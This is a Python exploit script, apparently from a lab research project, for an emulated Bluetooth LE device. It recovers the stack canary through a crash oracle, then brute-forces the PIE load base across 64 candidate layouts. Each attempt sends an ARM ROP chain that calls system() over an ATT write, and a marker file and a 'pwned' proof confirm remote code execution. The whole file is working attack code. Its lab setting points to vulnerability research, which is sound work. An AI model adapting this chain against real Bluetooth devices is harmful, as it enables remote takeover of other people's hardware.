#!/usr/bin/env python3
"""Brute force the load base of a PIE target, then exploit it.

Two independent unknowns:

  1. the stack canary  -> crash oracle, byte by byte (see brute.py)
  2. the load base     -> 64 candidate layouts, one write each; the right one
                          runs the command and leaves a marker file

Only the winning layout is used for the real payload afterwards.
"""
from __future__ import annotations

import argparse
import asyncio
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "research"))

from brunel import emulator, protocol  # noqa: E402
from brunel.rce import arm_rop  # noqa: E402

from brute import ACTION, recover, wait_up  # noqa: E402

CANARY_START = 256
CHAIN = 264


def rows() -> list[dict]:
    return [
        json.loads(line)
        for line in (ROOT / "lab/build/emulator/symbols.jsonl").read_text().splitlines()
        if line
    ]


def build(sym: dict, canary: bytes, command: str) -> bytes:
    base = sym["base"]
    command_addr = base + sym["command"] + CHAIN + 16
    value = arm_rop(
        base + sym["system"],
        base + sym["gadget"],
        command,
        CHAIN,
        512,
        gadget_words=3,
        system_thumb=False,
        command_addr=command_addr,
        shadow_base=base + sym["command"],
        return_addr=(base + sym["continue"]) | 1,
        lr_gadget=base + sym["gadget_lr"],
    )
    value = bytearray(value)
    value[CANARY_START : CANARY_START + 4] = canary
    return bytes(value)


async def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=9200)
    parser.add_argument("--settle", type=float, default=0.2)
    parser.add_argument("--recovery", type=float, default=8.0)
    parser.add_argument("--canary", help="skip recovery and use this canary")
    args = parser.parse_args()

    transport = emulator.EmulatorTransport(port=args.port)
    await transport.open()
    await transport.connect("78:C4:0E:00:00:00")
    handle = await transport.find_handle(ACTION)
    if handle is None:
        raise SystemExit("0x1f20 not found")

    if args.canary:
        canary = bytes.fromhex(args.canary)
    else:
        print("recovering canary", flush=True)
        canary = await recover(transport, handle, CANARY_START, 4, args.settle, args.recovery)
    print("canary", canary.hex(), flush=True)

    candidates = [row for row in rows() if row["name"].startswith("pie_")]
    for sym in candidates:
        await wait_up(transport, args.recovery)
        await transport.request_mtu(517)
        marker = f"piehit-{sym['name']}"
        command = f"/tmp/brunel-emu/sh -c 'echo {marker} > $EMU_STATE/hit'"
        value = build(sym, canary, command)
        await transport.send_att_command(protocol.att_write_command(handle, value))
        await asyncio.sleep(0.5)
        try:
            hit = (await transport.get("hit", timeout=0.5)).decode()
        except Exception:
            hit = ""
        if hit.strip() == marker:
            print(f"base {sym['name']} at 0x{sym['base']:x}", flush=True)
            await wait_up(transport, args.recovery)
            await asyncio.sleep(0.3)
            proof = f"/tmp/brunel-emu/sh -c 'echo pie-rce > $EMU_STATE/pwned'"
            await transport.send_att_command(
                protocol.att_write_command(handle, build(sym, canary, proof))
            )
            for _ in range(12):
                await asyncio.sleep(0.4)
                try:
                    print("proof:", (await transport.get("pwned")).decode().strip(), flush=True)
                    return 0
                except Exception:
                    continue
            print("proof: missing", flush=True)
            return 1
        print(f"  {sym['name']} no", flush=True)
    raise SystemExit("no layout matched")


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
